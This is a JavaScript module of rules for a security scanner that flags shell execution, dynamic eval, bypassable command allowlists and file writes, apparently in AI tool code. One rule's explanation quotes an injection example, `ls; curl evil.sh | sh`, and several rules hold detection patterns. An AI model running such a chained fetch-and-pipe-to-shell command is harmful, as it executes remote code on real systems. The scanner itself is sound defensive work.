import { makeFinding, lineOf, snippet } from '../util.js';

export const shellExecution = {
  id: 'shell-exec',
  group: 'capability',
  title: 'Executes shell commands',
  severity: 'high',
  why:
    'Shell access turns a data source into an actor. Once the model can pass a string to a shell, argument ' +
    'injection becomes command injection and the tool description becomes the trust boundary.',
  fix: 'Use an allowlist, avoid `shell: true`, and quote interpolated values.',
  check(file) {
    if (!/\.(js|mjs|cjs|ts|py|rb|go|rs|sh|ps1)$/.test(file.ext)) return [];
    const re = /\b(execSync|exec|spawnSync|spawn|execFile)\s*\(|child_process|subprocess\.(?:run|call|check_output|Popen)|os\.system|Command::new|sh\s+-c|bash\s+-c/g;
    const out = [];
    for (const m of file.text.matchAll(new RegExp(re.source, 'g'))) {
      const near = file.text.slice(m.index, m.index + 200);
      const shellTrue = /shell\s*:\s*true/.test(near);
      out.push(
        makeFinding(this, file.relative, lineOf(file.text, m.index), snippet(file.text, m.index, 45), {
          severity: shellTrue ? 'critical' : this.severity,
          detail: shellTrue ? 'string shell, injection-prone' : 'process spawn',
        }),
      );
      if (out.length >= 6) break;
    }
    return out;
  },
};

export const evalUsage = {
  id: 'dynamic-eval',
  group: 'capability',
  title: 'Evaluates dynamic code',
  severity: 'medium',
  why: '`eval`, `new Function` and `pickle.loads` execute data as code. Whatever supplies the data supplies the code.',
  fix: 'Prefer parsing over evaluation; for pickle, note that it is not safe on untrusted input.',
  check(file) {
    const re = /\b(eval\s*\(|new Function\s*\(|Function\s*\(\s*["'`]|pickle\.loads?|yaml\.load\s*\((?![^)]*Loader\s*=\s*yaml\.(?:Safe|CSafe)Loader))/g;
    const out = [];
    for (const m of file.text.matchAll(re)) {
      out.push(makeFinding(this, file.relative, lineOf(file.text, m.index), snippet(file.text, m.index, 40)));
      if (out.length >= 4) break;
    }
    return out;
  },
};

const WEAK_ALLOWLIST = [
  { re: /^\/[^/]+\/\s*$/, note: 'unanchored regex matches anywhere in the command' },
  { re: /\.\*/g, note: 'dot-star matches across arguments' },
];

export const weakAllowlist = {
  id: 'weak-allowlist',
  group: 'capability',
  title: 'Command allowlist can be bypassed',
  severity: 'high',
  why:
    'An allowlist is only a boundary if it matches the whole command. Unanchored patterns and greedy `.*` let ' +
    '`ls; curl evil.sh | sh` through a rule meant to permit `ls`.',
  fix: 'Anchor patterns (`^…$`), and check for shell metacharacters separately.',
  check(file) {
    if (!/\.(js|mjs|cjs|ts|py|go|rs)$/.test(file.ext)) return [];
    const out = [];
    const blockRe = /(allow(?:ed)?(?:Commands|_commands|List|list)?|ALLOWED_COMMANDS|allowed)\s*[:=]\s*\[([\s\S]{0,900}?)\]/gi;
    let m;
    while ((m = blockRe.exec(file.text))) {
      const body = m[2];
      if (!body.trim()) continue;
      const weak = [];
      for (const test of WEAK_ALLOWLIST) {
        if (test.re instanceof RegExp) {
          const found = body.match(test.re);
          if (found && test.note.includes('unanchored')) {
            const unanchored = [...body.matchAll(/\/((?:\\.|[^/\n])*)\/([gimsuy]*)/g)].filter(
              (r) => !/^\^/.test(r[1]) || !/\$$/.test(r[1]),
            );
            if (unanchored.length) weak.push(`${unanchored.length} unanchored regex`);
          }
          if (test.note.includes('dot-star') && /\.\*/.test(body)) weak.push('wildcard `.*`');
        }
      }
      const subshell = /[;&|]/.test(body) ? [] : ['no metacharacter check'];
      const reasons = [...new Set([...weak, ...subshell])];
      if (!reasons.length) continue;
      out.push(
        makeFinding(this, file.relative, lineOf(file.text, m.index), snippet(file.text, m.index, 60), {
          detail: reasons.join(', '),
        }),
      );
    }
    return out;
  },
};

export const writeCapability = {
  id: 'write-capability',
  group: 'capability',
  title: 'Can write or mutate files and state',
  severity: 'medium',
  why: 'Read-plus-write is where mistakes become damage. Note whether writes are confined and whether they are reversible.',
  fix: 'Confine write roots, and prefer explicit overwrite semantics over silent replace.',
  check(file) {
    const re = /\b(writeFileSync|writeFile|appendFile|rmSync|unlinkSync|rmdirSync|shutil\.(?:copy|move|rmtree)|os\.remove|fs\.promises\.(?:writeFile|rm|mkdir))/g;
    const out = [];
    for (const m of file.text.matchAll(re)) {
      out.push(makeFinding(this, file.relative, lineOf(file.text, m.index), snippet(file.text, m.index, 40)));
      if (out.length >= 3) break;
    }
    return out;
  },
};

export const rules = [shellExecution, evalUsage, weakAllowlist, writeCapability];